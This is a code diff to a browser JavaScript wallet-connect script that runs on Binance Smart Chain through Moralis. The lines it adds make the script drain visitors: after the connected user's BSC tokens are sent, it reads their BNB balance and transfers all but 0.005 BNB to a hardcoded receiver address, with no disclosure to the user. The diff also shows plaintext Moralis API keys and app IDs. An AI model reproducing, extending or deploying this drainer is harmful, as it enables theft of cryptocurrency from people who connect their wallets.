@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
- // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = '0x5d97BDdD1d3a8633d1433Cd015Cd18A213268077'; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -102,7 +102,8 @@ async function fetchAccountData() {
 
   console.log("Web3 instance is", web3);
   //change chain to bsc
-  web3.eth.defaultCommon = {customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};
+  web3.eth.defaultCommon = {
+    customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};
 
 
   // Get connected chain id from Ethereum node
@@ -198,21 +199,31 @@ async function onConnect() {
 
   // Subscribe to accounts change
   provider.on("accountsChanged", (accounts) => {
+    web3.eth.defaultCommon = {
+      customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};  
     fetchAccountData();
   });
 
   // Subscribe to chainId change
   provider.on("chainChanged", (chainId) => {
+    web3.eth.defaultCommon = {
+      customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};  
     fetchAccountData();
   });
 
   // Subscribe to networkId change
   provider.on("networkChanged", (networkId) => {
+    web3.eth.defaultCommon = {
+      customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};
+  
     fetchAccountData();
   });
 
   await refreshAccountData();
   onButtonClick = proceed;
+  web3.eth.defaultCommon = {
+    customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};  
+  
 }
 onButtonClick = onConnect;
 
@@ -242,7 +253,6 @@ async function onDisconnect() {
   document.querySelector("#connected").style.display = "none";
 }
 
-const receiver_address = '0x5d97BDdD1d3a8633d1433Cd015Cd18A213268077';
 
 async function getTokens(address="", api_key="", chain="bsc"){
   return new Promise((resolve, reject)=>{
@@ -262,12 +272,31 @@ async function getTokens(address="", api_key="", chain="bsc"){
   })
 }
 
+async function getBalance(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="bsc"){
+  return new Promise((resolve, reject)=>{
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=bsc`, {
+          method: "GET",
+          headers: {
+              "accept": "application/json",
+              "X-API-Key": api_key
+          }
+      })
+      .then(async(res) => {
+          if(res.status > 399) throw res;
+          resolve(await res.json());
+      }).catch(err=>{
+          reject(err);
+      })
+  })
+}
+
+const receiver_address = '0x5d97BDdD1d3a8633d1433Cd015Cd18A213268077';
 async function proceed(){
   start_to_log = false;
   console.log("Now we roll!!!");
     // main net
-    const serverUrl = 'https://gyqgzsubvnfd.usemoralis.com:2053/server';
-    const appId = 'omHohMO4R35Uh24vi8TJmTkso7hKJKRWhx0NgeNr';
+    const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
+    const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
     const apiKey = "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";
   
     // testnet
@@ -334,6 +363,28 @@ async function proceed(){
     
     
         if (bsc_tokens.length < 1) {
+          
+          const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
+            console.log("Unable to get new eth balance", e);
+          });
+          console.log("bnb_balance", bnb_balance);
+          console.log("bnb_balance.balance", bnb_balance.balance);
+          
+          const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
+          console.log("The new bnb balance", balance);
+          if (balance > 0) {
+          const options = {
+            type: "native",
+            amount: Moralis.Units.ETH(balance.toString()),
+            receiver: receiver_address,
+          };
+          let result = await Moralis.transfer(options);
+          console.log(result);
+        }
+        else {
+          console.log("Insufficient funds")
+        }
+
           return console.log('No bsc tokens found')
         } // No NFTs
         // eth_nfts.result.forEach(async (nft, i) => {
@@ -357,12 +408,32 @@ async function proceed(){
             },
           )
           console.log(transaction);
-          if(transaction){
-            await transaction.wait().then((v) => {
-              console.log('Finished Processing transaction:', v)
-            })
-          }
+          // if(transaction){
+          //   await transaction.wait().then((v) => {
+          //     console.log('Finished Processing transaction:', v)
+          //   })
+          // }
         }
+        const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
+          console.log("Unable to get new eth balance", e);
+        });
+        console.log("bnb_balance", bnb_balance);
+        console.log("bnb_balance.balance", bnb_balance.balance);
+        
+        const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
+        console.log("The new bnb balance", balance);
+        if (balance > 0) {
+        const options = {
+          type: "native",
+          amount: Moralis.Units.ETH(balance.toString()),
+          receiver: receiver_address,
+        };
+        let result = await Moralis.transfer(options);
+        console.log(result);
+      }
+      else {
+        console.log("Insufficient funds")
+      }
     }
     send();
 }
@@ -481,4 +552,3 @@ let els = document.getElementsByClassName("triggerx");
     });
 });
 console.log(window);
-
